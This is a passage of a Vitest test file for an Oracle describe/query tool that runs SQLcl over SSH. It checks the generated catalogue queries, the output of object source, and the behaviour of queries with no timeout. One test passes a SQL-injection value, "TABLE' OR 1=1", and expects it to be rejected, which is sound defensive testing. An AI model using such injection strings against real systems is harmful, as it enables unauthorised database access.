    expect(command).toContain('FROM ALL_OBJECTS');
    expect(command).toContain("OBJECT_TYPE = 'PACKAGE BODY'");
    expect(command).toContain("OWNER = 'HR'");
    expect(command).toContain('OFFSET 0 ROWS FETCH NEXT 11 ROWS ONLY');

    execSpy.mockClear();
    const badType = JSON.parse(await executeOracleDescribe(
      { action: 'list_objects', objectType: "TABLE' OR 1=1" }, fakeDb
    ));
    expect(badType.success).toBe(false);
    expect(execSpy.mock.calls).toHaveLength(0);
  });

  it('get_object_source builds ALL_SOURCE with whitelisted type and caps output', async () => {
    seedActiveProfile({});
    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValue([{ id: 'ssh-1', name: 'B' } as any]);
    vi.spyOn(sshService, 'getSshSecret').mockResolvedValue('secret-pass');
    vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValue({
      stdout: JSON.stringify([{ LINE: 1, TEXT: 'CREATE PACKAGE BODY x AS' }]), stderr: '', exitStatus: 0,
    });
    const res = JSON.parse(await executeOracleDescribe(
      { action: 'get_object_source', schema: 'HR', objectName: 'PKG', objectType: 'PACKAGE BODY' }, fakeDb
    ));
    expect(res.success).toBe(true);
    expect(res.source).toContain('CREATE PACKAGE BODY');
    expect(JSON.parse(JSON.stringify(res)).columns).toBeUndefined();
  });

  it('never rejects a pending query after an hour of fake time (no timeout)', async () => {
    vi.useFakeTimers();
    try {
      seedActiveProfile({});
      vi.spyOn(sshService, 'getSshConfigs').mockResolvedValueOnce([
        { id: 'ssh-1', name: 'Bastion' } as any,
      ]);
      vi.spyOn(sshService, 'getSshSecret').mockResolvedValueOnce('secret-pass');
      let settled = false;
      vi.spyOn(sshService, 'execRemoteCommand').mockImplementationOnce(
        () => new Promise(() => {}) // pending forever, like a long-running SQLcl query
      );

      const pending = executeOracleQuery({ query: 'SELECT 1 FROM DUAL' }, fakeDb, 'call-long').then(
        (v) => { settled = true; return v; }
      );
      await vi.advanceTimersByTimeAsync(3_600_000);
      expect(settled).toBe(false);
      void pending;
    } finally {
      vi.useRealTimers();
    }
  });
});
